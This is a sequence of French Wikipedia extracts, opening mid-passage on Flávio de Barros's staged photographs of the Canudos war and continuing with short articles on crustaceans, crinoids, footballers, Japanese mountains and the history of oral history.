L’insuccès de la troisième expédition, connue aussi sous le nom d’"expédition Moreira César" (du nom de son commandant en chef), avait eu un effet délétère sur l’image de marque de l’armée brésilienne, et, malgré les perspectives de victoire, la présente quatrième expédition montrait des signes de fatigue, nonobstant que l’effectif total se montât maintenant à plus de dix mille hommes de troupe. Quelques semaines auparavant, le tour pris par les événements sur le terrain avait pu laisser craindre un effondrement imminent de l’armée régulière et un cauchemar plus terrifiant encore que l’expédition Moreira César de . De plus, l’indiscipline des soldats et l’impéritie du haut commandement étaient évoquées dans les reportages des correspondants de presse, notamment de Manuel Benício. Accélérer la conclusion du conflit, légitimer l’intervention armée contre les habitants de Canudos et diffuser une image favorable de l’institution militaire, voilà quels étaient en les principaux objectifs de l’armée, et la photographie était appelée à être une puissante alliée dans l’atteinte de ces buts.
Conditions de travail et contraintes.
Soucieux donc de l’image de ses principaux commandants et de la corporation militaire en tant que telle, le haut commandement de la quatrième expédition entendit imposer un système de contrôle sur les informations relatives à la guerre en cours. Il fut disposé que tous les messages télégraphiques des correspondants de presse envoyés à partir de Monte Santo, la base d’opérations, et des environs immédiats, devaient être préalablement lues par des officiers désignés par le haut commandement. Aussi la censure militaire exercée durant les cinq derniers mois de la guerre, en particulier à la suite de la publication des commentaires très critiques du journaliste Manuel Benício sur la désastreuse opération menée par Artur Oscar, devait-elle également imposer son empreinte sur les travaux de Flávio de Barros.
En effet, au moyen d’un contrôle du télégraphe et, de façon générale, du courrier, l’armée pratiqua une implacable censure, que complétaient des menaces physiques à l’encontre de correspondants qui divulgueraient des nouvelles préjudiciables à l’armée, comme ce fut le cas vis-à-vis du courageux Manuel Benício, envoyé spécial du "Jornal do Commercio", contraint de s’éloigner de la zone de guerre. Une étroite collaboration fut établie entre la presse et l’armée, dans le cadre de laquelle des militaires, ou des journalistes qui étaient en même temps officiers de réserve, tel qu’Euclides da Cunha, nommé attaché auprès du maréchal Bittencourt, se chargeaient de rédiger des articles et, ultérieurement, des livres.
C’est dans ce contexte de contraintes, auxquelles le photographe ne pouvait se soustraire, qu’il convient de considérer les clichés produits. Ainsi p.ex., alors que, peu avant, l’un des problèmes majeurs qu’avaient eus à affronter les officiers et les soldats était la difficulté d’assurer une alimentation satisfaisante et régulière, les convois de ravitaillement étant en effet rares et incertains, et souvent attaqués par les "jagunços" du Conselheiro, Flávio de Barros s’attacha à fixer sur la pellicule des scènes de repas d’hommes de troupe et d’officiers, s’efforçant de minimiser cette question et de représenter une réalité naguère encore très inhabituelle dans le quotidien des troupes.
Une autre réalité reconstituée par le regard de Barros est le faux élan de solidarité des troupes envers leurs ennemis, vision tendancieuse incarnée notamment par la photographie intitulée par Barros "Corps sanitaire et une maquisarde blessée" (en port. "Corpo Sanitário e uma jagunça ferida"), montrant un groupe de médecins et d’infirmiers groupés autour d’un brancard sur lequel une "conselheiriste" est allongée. Il s’agissait là d’une question d’importance pour l’image de marque de l’armée républicaine, au regard des récits relatant les atrocités commises par les troupes pendant les combats et les égorgements indiscriminés de "conselheiristes" faits prisonniers. Sur quelques clichés, on voit des enfants de rebelles morts apparaître aux côtés d’officiers et de soldats, apparemment sous leur protection. La mise en scène de rebelles côtoyant les troupes républicaines servait une stratégie visant à illustrer la préoccupation de l’armée pour les orphelins de la guerre. Du reste, l’adoption d’enfants orphelins ("jaguncinhos") sera, une fois le conflit terminé, une pratique bien établie, destinée à atténuer le solde tragique des opérations militaires.
Une même vision tendancieuse se dégage de la photographie intitulée "Capture de maquisards par la cavalerie" (en port. "Prisão de jagunços pela cavalaria"), dans laquelle les "conselheiristes" faits prisonniers, que l’on identifie sans peine par l’expression des différents protagonistes, s’inscrivent dans une composition statique, simulacre propre à infuser l’idée de l’efficacité et de la célérité de l’armée républicaine et à nier l’agilité et l’adresse des "Canudenses", situation d’une occurrence en réalité fort rare, attendu que ceux-ci répugnaient à se rendre vivants aux troupes régulières — à telle enseigne que le général Artur Oscar manifesta un jour le désir de « voir un jagunço vivant ».
Dans le même ordre apparaissent symptomatiques trois autres images encore, qui devaient attester de la capitulation finale et de la défaite définitive des insurgés : capture d’un "conselheiriste" par les soldats du d’infanterie ; reddition de centaines de "conselheiristes" le ; et le cliché du cadavre exhumé d’Antônio Conselheiro, incontestablement l’image réalisée par Flávio de Barros la plus diffusée. Les adversaires "conselheiristes" ne sont jamais représentés que dans la position de vaincu, de prisonnier ou de tué.
Les prises de vue de Barros reflètent donc bien le regard du vainqueur et mettent en scène le triomphe de l’homme civilisé sur l’inculte, l’arriéré, le sauvage, tout en veillant à exclure quasi totalement les registres dramatiques et les aspects moins ragoûtants de la guerre : misère, faim, atrocités, décollations de prisonniers, soldats blessés ou tués, installations précaires des hôpitaux de campagne, etc. Une seule image, du reste assez peu nette, donne à voir expressément quelques cadavres de "conselheiristes" jonchant le sol, mêlés aux décombres calcinés des maisons brûlées durant l’assaut final, scène marquante de la phase finale de la guerra, que les reporters aimeront à évoquer avec pathétisme.
Néanmoins, les photos de Barros ont pu donner lieu à des interprétations diverses, voire contradictoires.
Les clichés réalisés.
Ainsi les photographies de Flávio de Barros, bien que parées du supposé statut de fidèle reflet du réel, ne sont-elles pas exemptes de subjectivité et ne constituent-elles guère autre chose que des simulacres de la guerre, destinés à tenter de légitimer l’intervention armée et à attester de la supériorité et de la bonne organisation de l’armée républicaine, et tendant à effacer l’impression d’impréparation des troupes et à escamoter les actes criminels commis à l’encontre des combattants faits prisonniers.
Toutes les images ont par ailleurs quelque chose de figé : les objets et les personnages apparaissent immobiles, pas seulement par des causes techniques, mais aussi par suite du désir de pose et d’ostentation des personnes portraiturées, désireuses au premier chef de garder un témoignage de la campagne militaire ou d’emporter un souvenir pour la famille et pour les amis, épouses et fiancées. Plusieurs officiers n’y figurent pas en uniforme, et quelques-uns s’y montrent avec la vanité d’élégants flâneurs de la "rua do Ouvidor" de Rio de Janeiro.
La série photographique complète compte 69 clichés. Les originaux sont conservés aux Archives historiques du musée de la République, division de la Recherche, qui possède l’une des deux seules collections complètes parvenues jusqu’à nous, l’autre se trouvant aux mains de l’anthropologue bahianais Renato Ferraz.
Éditées récemment (1997) sous forme de deux albums, le premier comportant 15 clichés et le deuxième 54, ces photographies sont les seules existantes de la guerre de Canudos et constituent la partie la plus précieuse de la peu abondante iconographie authentique du conflit, à côté de rares croquis et cartes dessinés par des journalistes et des militaires, dont Euclides da Cunha et le lieutenant-colonel Siqueira de Menezes.
Sur le total des photos, 65% représentent des officiers ou les troupes en corps organisés, dans les tranchées ou dans les campements. Les photos de la première partie soulignent les aspérités et l’aridité du terrain, le danger de l’expédition, les difficultés de la victoire ; celles de la deuxième montrent la satisfaction éprouvée devant la défaite de l’ennemi et la destruction de son repaire, satisfaction mêlée d’une touche d’héroisme et d’affliction pour les camarades morts au combat ; celles de la troisième partie de cette édition, qui comporte de loin le plus grand nombre de clichés, évoquent des scènes se passant avant ou après les combats, éloignées de ceux-ci, quelques-unes presque idylliques, figurant des moments de loisir ou d’exercice militaire, où par conséquent le degré de mise en scène est plus prononcé encore que dans les autres parties, et où, plus qu'ailleurs, la guerre apparaît comme une aventure, un moment de camaraderie et une occasion d’affirmer une identité de groupe. Ultérieurement, ces photos seront aussi mises à contribution lors de projections électriques à l’attention du grand public, annoncées souvent à grand renfort de réclame sensationnaliste.
Outre les clichés déjà décrits ci-haut, il convient de relever également :
Édition.
Une édition complète des photographies de Flávio de Barros a paru en 1997, à l’occasion du centenaire de la fin de la guerre de Canudos. L’ouvrage, qui se compose de deux albums, l’un de 15 et l’autre de 54 prises de vue, a été doté par les soins du professeur Cícero de Almeida d’une brève introduction, retraçant succinctement l’histoire de cette guerre ainsi que la genèse et le destin des photographies, et chaque cliché individuel a été assorti d’un commentaire par le même Cícero de Almeida. On peut regretter que n’aient pas été gardés les titres d’origine, lesquels étaient en fait des légendes, des caractérisations qui, pour erronées qu’elles soient pour la plupart, faisaient partie intégrante, par leur charge idéologique "anticonselheiriste", au même titre que l’image proprement dite, de la mise en scène héroïque et idéalisée de cet événement historique telle que voulue et propagée par les autorités militaires.

</doc>
<doc id="8979412" url="https://fr.wikipedia.org/wiki?curid=8979412" title="Forestry Commission">
Forestry Commission



</doc>
<doc id="8979418" url="https://fr.wikipedia.org/wiki?curid=8979418" title="Le collège fou, fou, fou ! Flash! Kimengumi">
Le collège fou, fou, fou ! Flash! Kimengumi



</doc>
<doc id="8979421" url="https://fr.wikipedia.org/wiki?curid=8979421" title="Oplophoroidea">
Oplophoroidea

Oplophoroidea est une super-famille de crustacés décapodes.
Liste des familles.
Selon :

</doc>
<doc id="8979425" url="https://fr.wikipedia.org/wiki?curid=8979425" title="Alisometra">
Alisometra

Alisometra est un genre de crinoïdes de la famille des Colobometridae.
Liste des espèces.
Selon :

</doc>
<doc id="8979435" url="https://fr.wikipedia.org/wiki?curid=8979435" title="Cenometra">
Cenometra

Cenometra est un genre de crinoïdes de la famille des Colobometridae.
Description et caractéristiques.
Ces comatules peuvent avoir jusqu'à 40 bras. Les brachitaxes sont composés de deux ossicules, avec des colerettes adambulacraires. La seconde pinnule est massive, dure et incurvée. 
Liste des espèces.
Selon :

</doc>
<doc id="8979441" url="https://fr.wikipedia.org/wiki?curid=8979441" title="Mont Nōgōhaku">
Mont Nōgōhaku

Le se trouve à la limite des préfectures de Gifu et Fukui au Japon. La montagne, qui fait partie des monts Ryōhaku, sert de ligne de partage des eaux entre l'océan Pacifique et la mer du Japon. Une station de triangulation est installée à son sommet.
"Fragaria iinumae" a été découverte pour la première fois sur les flancs de la montagne et a reçu le nom .

</doc>
<doc id="8979442" url="https://fr.wikipedia.org/wiki?curid=8979442" title="SV Austria Salzbourg">
SV Austria Salzbourg



</doc>
<doc id="8979449" url="https://fr.wikipedia.org/wiki?curid=8979449" title="War of the Worlds (2015)">
War of the Worlds (2015)

L'édition 2015 de War of the Worlds est un ' de catch produit par la Ring of Honor (ROH) et par la New Japan Pro Wrestling (NJPW), qui est disponible uniquement en ligne et par Ustream. Cette manifestation de catch se déroulera les 12 et au 2300 Arena à Philadelphie en Pennsylvanie. Ce sera la de War of the Worlds de l'histoire de la ROH. C'est également le troisième ' qui s'effectue en collaboration entre la ROH et la NJPW, après l'édition 2014 de ce spectacle.
Production.
Le , lors de ', la New Japan Pro Wrestling annonce pour la deuxième année consécutive la production de deux shows événementiels entre les deux fédérations. Le , la Ring of Honor annonce qu'il y aura finalement trois spectacles co-produits par les deux fédérations cette année, dont deux dates prévues pour '. Le , la ROH décide d'étaler finalement ce spectacle sur deux jours, après la vente de la plupart des places disponibles pour le .
Contexte.
Les spectacles de la Ring of Honor en paiement à la séance sont constitués de matchs aux résultats prédéterminés par les scénaristes de la ROH. Ces rencontres sont justifiées par des ' - une rivalité avec un catcheur, la plupart du temps - ou par des qualifications survenues au cours de shows précédant l'évènement. Tous les catcheurs possèdent un ', c'est-à-dire qu'ils incarnent un personnage face (gentil) ou heel (méchant), qui évolue au fil des rencontres. Un ' comme ' est donc un événement tournant pour les différentes "" en cours.

</doc>
<doc id="8979450" url="https://fr.wikipedia.org/wiki?curid=8979450" title="Sayed Ali Bechir">
Sayed Ali Bechir

Sayed Ali Bechir () (né le en Mauritanie) est un joueur de football international qatarien d'origine mauritanienne, qui évoluait au poste d'attaquant.
Biographie.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 49 matchs (pour 15 buts inscrits) entre 2001 et 2009. 
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2004 et de 2007.
Il joue également 13 matchs comptant pour les tours préliminaires de la coupe du monde, lors des éditions 2002, 2006 et .
Il participe enfin à la Coupe du monde des moins de 17 ans 1999 organisée en Nouvelle-Zélande.

</doc>
<doc id="8979451" url="https://fr.wikipedia.org/wiki?curid=8979451" title="Pasiphaeidae">
Pasiphaeidae

Les Pasiphaeidae sont une famille de crustacés décapodes, la seule de la super-famille des Pasiphaeoidea.
Liste des familles.
Selon :

</doc>
<doc id="8979452" url="https://fr.wikipedia.org/wiki?curid=8979452" title="Pasiphaeoidea">
Pasiphaeoidea



</doc>
<doc id="8979458" url="https://fr.wikipedia.org/wiki?curid=8979458" title="Ninalaid">
Ninalaid

Ninalaid est une île d'Estonie, en mer Baltique.
Géographie.
Elle se situe à proximité de la côte Nord-Ouest d'Hiiumaa et de Külalaid. 

</doc>
<doc id="8979461" url="https://fr.wikipedia.org/wiki?curid=8979461" title="Physetocaris microphthalma">
Physetocaris microphthalma

Physetocaris microphthalma est une espèce de crevettes (crustacés décapodes). Très isolée génétiquement, c'est la seule de son genre (Physetocaris), de sa famille (Physetocarididae) et de sa super-famille (Physetocaridoidea).
Habitat et répartition.
On trouve cette crevette dans l'Atlantique est chaud tropical et subtropical.

</doc>
<doc id="8979462" url="https://fr.wikipedia.org/wiki?curid=8979462" title="Physetocaridoidea">
Physetocaridoidea



</doc>
<doc id="8979463" url="https://fr.wikipedia.org/wiki?curid=8979463" title="Physetocarididae">
Physetocarididae



</doc>
<doc id="8979464" url="https://fr.wikipedia.org/wiki?curid=8979464" title="Physetocaris">
Physetocaris



</doc>
<doc id="8979468" url="https://fr.wikipedia.org/wiki?curid=8979468" title="Cyllometra">
Cyllometra

Cyllometra est un genre de crinoïdes de la famille des Colobometridae.
Liste des espèces.
Selon :

</doc>
<doc id="8979471" url="https://fr.wikipedia.org/wiki?curid=8979471" title="(52768) 1998 OR2">
(52768) 1998 OR2

 est un astéroïde Amor potentiellement dangereux découvert le par NEAT à l'observatoire du Haleakalā.
Approche de 2020.
Il est passé à 6,3 millions de kilomètres de la Terre le .
L'astéroïde a été observé par le radiotélescope d'Arecibo le .

</doc>
<doc id="8979472" url="https://fr.wikipedia.org/wiki?curid=8979472" title="Optical, Spectroscopic, and Infrared Remote Imaging System">
Optical, Spectroscopic, and Infrared Remote Imaging System

OSIRIS (Optical, Spectroscopic, and Infrared Remote Imaging System, soit en français « Système d'imagerie optique, spectroscopique et infrarouge à distance ») est le principal système scientifique d'imagerie sur l'orbiteur "Rosetta" de l'Agence spatiale européenne. Il a été construit par un consortium mené par l'Institut Max-Planck de recherche sur le Système solaire, en Allemagne.

</doc>
<doc id="8979474" url="https://fr.wikipedia.org/wiki?curid=8979474" title="Gaël Andonian">
Gaël Andonian

Gaël Andonian, né le à Marseille dans le département français des Bouches-du-Rhône, est un footballeur international arménien qui possède aussi la nationalité française. Il joue au poste de défenseur central ou latéral.
Biographie.
Début à l'Olympique de Marseille.
Natif de Marseille, le gaucher intègre son club de cœur, l'Olympique de Marseille, à dix ans après être passé par le club de Gemenos où il est immédiatement surclassé. Il rejoint le club d'Aubagne avant d'arriver à l'OM. Si à cette époque il joue au milieu de terrain, il recule au cours des années suivantes : passant milieu défensif, puis défenseur central ou à gauche de l'arrière garde.
Il rejoint l'équipe réserve à partir de la saison 2011-2012, avant d'en devenir le capitaine quelques années plus tard. En 2012-13, il est appelé à deux reprises dans le groupe professionnel, face à l'AS Nancy et contre l'AEL Limassol en Ligue Europa mais n'entre pas en jeu.
En 2014-2015, il effectue la troisième année de son contrat stagiaire. Cette saison, il joue son tout premier match professionnel en entrant en jeu en fin de partie au Stade Vélodrome lors de la victoire deux buts à un face au RC Lens, où il fait équipe en défense centrale avec Baptiste Aloé, lui aussi pur produit de la formation olympienne. Il figure également dans le groupe pour le déplacement à Paris. Le , Gaël signe son premier contrat professionnel avec l'Olympique de Marseille. Il est à nouveau dans le groupe lors de sept rencontres en fin de saison mais n'entre plus en jeu.
Des prêts pour gagner du temps de jeu.
Le , Gaël Andonian est prêté jusqu'à la fin de la saison au Dijon FCO où il est recruté comme joker médical. Il est titularisé dès le match suivant contre le Stade de Reims lors d'une victoire en coupe de la ligue puis trois jours plus tard en championnat contre le Stade brestois. Il marque ses deux premiers buts professionnel lors de la de Ligue 2 contre les Chamois niortais et offre le match nul à son équipe deux buts partout grâce à son doublé. Il joue dix matchs entre octobre et janvier puis disparaît de l'effectif, n'étant dans le groupe qu'une seule fois sans entrer en jeu. Le club termine second du championnat et est promu en Ligue 1.
En , il est prêté pour six mois au PAE Veria qui évolue en première division grec. Il jeu son premier match le 29 janvier en entrant en jeu contre l'Olympiakos puis est titularisé la semaine suivante contre l'AEK Athènes. Il participe au total à dix rencontres sur treize possible.
En 2018, il quitte librement l'Olympique de Marseille après y avoir passé quatorze saisons comptant un match avec l'équipe professionnel et soixante-douze avec l'équipe réserve.
Nouveau départ.
Le , il fait un essai dans le club britannique du Sunderland AFC et joue un match de championnat avec l'équipe réserve contre West Bromwich AFC lors d'une victoire deux buts à un. Il signe finalement aucun contrat avec le club anglais.
Après une saison sans club, il s'engage en faveur de l'AC Ajaccio qui évolue en Ligue 2. Présent sur le banc lors de la première journée, il n'entre pas en jeu et n'est plus présent une seule fois dans le groupe professionnel. Il est libéré en décembre 2019, seulement six mois après son arrivée. Début février, il s’engage sous les couleurs du FC Martigues qui évolue en National 2 pour y terminer la saison mais la Pandémie de Covid-19 met fin à la saison trois semaines plus tard. 
En septembre 2020, il signe en faveur du FC Aubagne également pensionnaire de National 2 avant de signer la saison suivante en National 3 à l'US Endoume puis à l'UGA Ardziv en 2022.
Sélections.
Il porte deux fois le maillot de l'équipe de France des moins de 16 ans en lors de deux matchs amicaux contre la Slovénie.
En , il fait sa demande de passeport arménien, ayant la double nationalité.
Le , il est convoqué par Bernard Challandes, dans le groupe de l'Arménie. Il joue son premier match avec l'Arménie contre l'Albanie le lors d'une défaite deux buts à un. Il participe aux éliminatoires pour l'Euro 2016 et pour la Coupe du monde 2018.
Statistiques.
Le tableau ci-dessous retrace la carrière de Gaël Andonian depuis ses débuts :
Sélection nationale d'Arménie.
Le tableau suivant liste les rencontres de l'équipe d'Arménie auxquelles Gaël Andonian a participé, depuis le jusqu'à présent.
Palmarès.
En 2014-2015, Gaël Andonian est champion du groupe G de CFA 2 () avec l'équipe réserve de l'Olympique de Marseille en participant à 21 rencontres de championnat.
Il est également vice-champion de Ligue 2 en 2016 avec le Dijon FCO.

</doc>
<doc id="8979475" url="https://fr.wikipedia.org/wiki?curid=8979475" title="Mont Sannomine">
Mont Sannomine

Le se trouve à la limite de Gujō dans la préfecture de Gifu et Hakusan dans la préfecture d'Ishikawa au Japan. La montagne culmine à d'altitude. Un point à d'altitude sur sa crête méridionale constitue le point culminant de la préfecture de Fukui.

</doc>
<doc id="8979480" url="https://fr.wikipedia.org/wiki?curid=8979480" title="Psalidopus">
Psalidopus

Psalidopus est un genre de crevettes (crustacés décapodes), le seul de la famille des Psalidopodidae et de la super-famille des Psalidopodoidea.
Liste des espèces.
Selon :

</doc>
<doc id="8979484" url="https://fr.wikipedia.org/wiki?curid=8979484" title="Psalidopodoidea">
Psalidopodoidea



</doc>
<doc id="8979485" url="https://fr.wikipedia.org/wiki?curid=8979485" title="Psalidopodidae">
Psalidopodidae



</doc>
<doc id="8979490" url="https://fr.wikipedia.org/wiki?curid=8979490" title="Petasometra">
Petasometra

Petasometra est un genre de crinoïdes de la famille des Colobometridae.
Liste des espèces.
Selon :

</doc>
<doc id="8979493" url="https://fr.wikipedia.org/wiki?curid=8979493" title="Lee Casciaro">
Lee Casciaro

Lee Casciaro, né le à Gibraltar, est un footballeur international gibraltarien qui évolue au poste d'attaquant.
Avec 59 titres remportés avec Lincoln FC reconnus par l'UEFA, il détient le record du plus grand nombre de titres avec un club, du plus grand nombre de titres en club et du plus grand nombre de titres de l'histoire du football. Il est à noter que son palmarès compte des trophées semi-professionnels ; en prenant uniquement les trophées professionnels, c’est Lionel Messi qui est le joueur le plus titré de tous les temps avec 46 trophées.
Biographie.
Policier de profession, il joue comme attaquant dans l'équipe semi-professionnelle des Lincoln Red Imps depuis la saison 2007-2008.
Depuis septembre 2014, il fait partie de l'équipe de Gibraltar. Le , il marque le premier but de l'histoire de Gibraltar dans une rencontre officielle, à l'occasion du match de qualification pour l'Euro 2016 contre l'Écosse (1-6).
Le , il devient le joueur le plus âgé (42 ans et 175 jours) à disputer un match de qualification pour les éliminatoires de l'Euro 2024, un match face à l'équipe de France.

</doc>
<doc id="8979496" url="https://fr.wikipedia.org/wiki?curid=8979496" title="Gabriel Théodore Vallier de Lapeyrouse">
Gabriel Théodore Vallier de Lapeyrouse

Gabriel Théodore Vallier de Lapeyrouse, né le à Embrun (Hautes-Alpes), mort le à Embrun (Hautes-Alpes), est un général de brigade de la Révolution française.
États de service.
Il entre en service en 1748, dans le génie, et en 1756, il obtient son diplôme d’ingénieur militaire. Il participe à la Guerre de Sept Ans en Allemagne et en Martinique. Il se fait remarquer en janvier 1760, au siège de Dillenburg, en sauvant les poudres enfermées dans une casemate, que l’incendie menace. Il obtient son brevet de capitaine en 1763, et en 1768, il rejoint la Corse. Il est fait chevalier de Saint-Louis en 1778.
Il est nommé lieutenant-colonel en 1785, et colonel le , directeur des fortifications à Embrun. De 1792 à 1793, il sert à l’armée des Alpes, puis il est arrêté et emprisonné à Gap le 19 novembre 1793, sur les ordres des représentants en mission Barras et Fréron. Libéré de prison le , il retourne à l’armée des Alpes le 17 juin 1794. 
Il est promu général de brigade le , et le , il est chargé de tracer les limites entre la France et les États Sardes. En 1799, il est membre de la commission militaire, chargée d’enquêter sur la reddition de bastions fortifiés en Italie. Le , il est nommé inspecteur général des fortifications, mais pour cause de maladie, il refuse le poste, et le , il devient directeur des fortifications des Hautes-Alpes et des Basses-Alpes.
Il est admis à la retraite le .
Il meurt le , à Embrun.

</doc>
<doc id="8979502" url="https://fr.wikipedia.org/wiki?curid=8979502" title="Jambinai">
Jambinai

Jambinai () est un groupe de post-rock sud-coréen, originaire de Séoul.
Biographie.
Le groupe est formé en 2010 à Séoul. Il présente la particularité d'utiliser des instruments modernes (guitare électrique, que joue Il-woo) et traditionnels comme le haegeum, instrument traditionnel à deux cordes, joué par Kim Bo-mi, et le geomungo, cithare à six cordes, joué par Shim Eun-yong. Musicalement, ils sont souvent comparés à des groupes comme Explosions in the Sky, Godspeed You! Black Emperor, et Mogwai. Dans les petites salles, seuls ces trois musiciens composent Jambinai. Mais sur les grandes scènes, le groupe ajoute à sa formation originelle une section rythmique (basse et batterie). Parfois d'autres instruments traditionnels coréens sont utilisés, tels le jungju, le taepyeongso ou le piri.
Outre dans son pays d'origine, Jambinai s'est produit en Europe (France, Pologne, Belgique) et au Japon.
Le groupe signe au label GMC Records, et publie l'EP "Jambinai" en 2010, suivi de son premier album studio, "Difference", le en Corée. Cet album est élu meilleur album "crossover" aux Prix de la musique coréenne 2013, permettant au groupe de participer à différents festivals internationaux comme le SXSW et ou le Festival de Glastonbury.
"A Hermitage", leur deuxième album, est publié au label Bella Union, le .

</doc>
<doc id="8979503" url="https://fr.wikipedia.org/wiki?curid=8979503" title="Günther Willms">
Günther Willms

Günther Willms (* le à Duisbourg ; † le à Ettlingen), est un juriste allemand travaillant dans les hautes autorités judiciaires et avec les juges fédéraux.
Biographie.
La famille est originaire de Westphalie ; son père travaille comme conseiller d'études jusqu'à son licenciement pour des motifs politiques. Après avoir fréquenté le gymnasium humaniste de Fulda, Günther Willms étudie le droit de 1930 jusqu'à 1933 à Munich, Bonn, Marbourg et Francfort. Après la formation de stagiaire, il est assesseur à Cassel, à Fulda, à Hanau et à Aschaffenbourg. En 1934 il est rayé de la liste provisoire des écrivains et doit se limiter aux travaux journalistiques occasionnels qu'il rédige fréquemment avec Fritz Maubach et publie principalement dans la "Frankfurter Zeitung". Il est officier de réserve pendant la Seconde Guerre mondiale qu’il termine comme capitaine. Depuis 1938 il travaille au service judiciaire et dès 1951 comme haut fonctionnaire dans les services administratifs fédéraux. De 1953 jusqu'à 1980 il est juge à la cour de cassation.
Il est membre de la , une corporation étudiante catholique de la .

</doc>
<doc id="8979506" url="https://fr.wikipedia.org/wiki?curid=8979506" title="Louis François Jeannest">
Louis François Jeannest

Louis François Jeannest né en 1781 et mort à Vaugirard le est un sculpteur et un médailleur français.

</doc>
<doc id="8979509" url="https://fr.wikipedia.org/wiki?curid=8979509" title="Histoire orale">
Histoire orale

Lhistoire orale est un concept qui désigne un ensemble de pratiques basées sur l'entrevue, souvent enregistrée, pour transmettre des témoignages au sujet de l'expérience vécue et du passé en général. Autrefois cantonnée à la cueillette de données scientifiques pour les historiens, elle s'est libéralisée au cours des dernières décennies, notamment à l'aide des nouvelles technologies audiovisuelles, et a pris une portée interdisciplinaire et parfois créative. Considérée aujourd'hui, notamment par la recherche qualitative, comme un moyen privilégié d'expression de la subjectivité, elle véhicule la mémoire des personnes interviewées en ce qui a trait entre autres à leur expérience personnelle. Elle concerne aussi le recueil de récits portés par des personnes qui ne sont pas nécessairement les témoins oculaires des faits rapportés. L'histoire orale se réfère également aux informations recueillies par cette méthode et aux travaux écrits (publiés ou non) basés sur ces données. Quoique ses traces soient traditionnellement conservées dans les dépôts d'archives et les grandes bibliothèques, l'apparition d'Internet ouvre de nouvelles avenues de diffusion.
Histoire.
Origines.
Utiliser des témoignages oraux en histoire est une pratique ancienne, le premier historien reconnu pour avoir travaillé avec des récits oraux est Hérodote d'Halicarnasse, qui écrit dans son deuxième livre : « À partir de maintenant, j'exposerai les récits ["logoi"] des Égyptiens comme je les ai entendus ["akouô"] ».
Pour Hérodote, les principaux instruments de la connaissance sont la vue, qui sert à voir les événements, les objets ou les monuments, et l'ouïe, qui permet de rassembler des témoignages oraux ("akoé"). Il privilégie la première à la seconde car il ne croit un témoignage que s'il a pu le vérifier visuellement, mais il utilise des sources orales surtout en ce qui concerne le passé ou les coutumes des peuples lointains, par exemple l'Inde, l'Éthiopie ou la Scythie.
Hérodote pense que l'enquête orale est moins fiable et plus compliquée que l'enquête visuelle. De plus, il distingue divers degrés d'informations venant d'une enquête orale. La source orale la plus sûre consiste à interroger personnellement quelqu'un qui a vu l'événement ou à interroger des personnes détenant un savoir officiel tel que les prêtres des Égyptiens ou les prêtresses de Dodone. Dans la mesure du possible, les paroles doivent être vérifiées par la vue. Cependant, beaucoup d'autres d'informations sont de deuxième voire de troisième main. Thucydide reprend sa méthode pour étudier la guerre du Péloponnèse.
Hérodote et Thucydide créent la notion de témoins oculaires et auriculaires et conçoivent les premières enquêtes orales croisant les témoignages qu'ils recueillent. Cette importance du témoin est conservée dans l'histoire depuis l'antiquité juive et chrétienne, en passant par les chroniques médiévales jusqu'à Voltaire ou même Michelet, historien du . En Chine, lors de la période de la dynastie Zhou (1122-256 ), l'empereur mande des scribes pour recueillir les paroles du peuple dans l'intérêt des historiens de la cour. Le missionnaire franciscain espagnol du , Bernardino de Sahagùn et ses assistants interrogent une douzaine d'Indiens qui connaissent bien l'histoire aztèque et écrivent sur cette base un livre comprenant . Les africanistes, quant à eux, se tournent depuis le (voire avant) vers la tradition orale, dont celle des griots, car il s'y trouve des informations transmises de génération en génération.
Rejet.
En dépit de la tradition de transmission orale de l'histoire, le mouvement scientifique critique cette pratique à la fin du . Celle-ci reste néanmoins forte pendant plus de cinquante ans, en particulier dans le recueil de contes. Certains historiens allemands du , dont Leopold von Ranke, veulent que les historiens relatent le passé objectivement en se basant sur des documents écrits et non à partir de leur imagination. Le même Ranke considère cependant les témoins oculaires comme les sources les plus authentiques et directes en histoire et s’appuie sur les documents écrits produits, correspondances, mémoires, rapports d'ambassade…
Ce discrédit est aussi porté par des chercheurs français. Ils rejettent les témoignages oraux appelés à l'époque « tradition orale ». Ils ne conservent que les documents écrits pour écrire l'Histoire.
Cependant, aux États-Unis, Hubert Howe Bancroft reconnait qu'il n'y a pas de grandes collections de livres, de journaux, de cartes et de manuscrits dans l'ouest Nord-américain mais que les sources sont les mémoires des personnes. Il engage des gens pour l'aider dans ses interviews et publie cinq volumes de témoignages.
Essor.
Durant le premier tiers du , d'autres historiens commencent à voir les bénéfices de l'histoire orale. Le "Federal Writers Project" (projet d'écrivains fédéraux), créé durant le New Deal, a pour but de montrer la diversité culturelle en Amérique. W. T. Couch décide d'étendre cette étude et rassemble plus de d'Américains. En France, ce sont les linguistes et les philologues qui entreprennent d'enregistrer des témoignages. Ils créent les « archives de la parole » en 1911.
Les historiens américains spécialistes de l'armée utilisent beaucoup les méthodes de l'histoire orale durant la Seconde Guerre mondiale, pour collecter des comptes rendus de la vie des militaires et des opérations militaires. Ils se servent aussi de documents écrits. Le lieutenant-colonel A. Marshall est un pionnier dans l'histoire orale de l'armée. Il interroge de nombreuses personnes à travers l'Europe à propos des opérations militaires. En 1948, Allan Nevins, professeur d'histoire à l'université Columbia, établit les premières archives afin de préserver les interviews. Il s'agit de l"Oral History Research Office" (service de recherche d'histoire orale). Avant d'être historien, il est journaliste et interroge directement des personnes, élément essentiel du métier de reporter. Jacques Barzun et Henry F. Graff, deux collègues de Nevins, appellent au scepticisme savant et à la vérification des témoignages. Ils considèrent les propos des témoins oculaires comme partiaux et peu fiables. Dans les années 1950, les universités de Californie à Los Angeles et Berkeley développent des archives d'histoire orale. Par la suite, plusieurs universités suivent leur exemple tout comme les bibliothèques présidentielles, les agences du gouvernement, les corporations, les syndicats de travailleurs et les ordres religieux. Tous créent leurs propres archives orales.
Les premiers projets d'histoire orale aux États-Unis sont des récits portant sur les élites politiques, économiques et culturelles et adoptent une perspective d'histoire orale « du haut vers le bas ». À l'inverse, les projets des Européens s'enracinent plutôt dans l'histoire sociale et culturelle associée aux mouvements politiques de gauche. Ils réexaminent l'histoire « de bas en haut », en incluant les voix des personnes auparavant exclues de l'histoire. En 1954, l'Université de Californie à Berkeley crée un département régional d'histoire orale. George Stawart décide de continuer les interviews de Hubert Howe Bancroft. Cinq ans plus tard, en 1959, l'Université de Californie à Los Angeles met en place un programme d'histoire orale, sur la demande d'historiens, de libraires et d'autres universitaires.
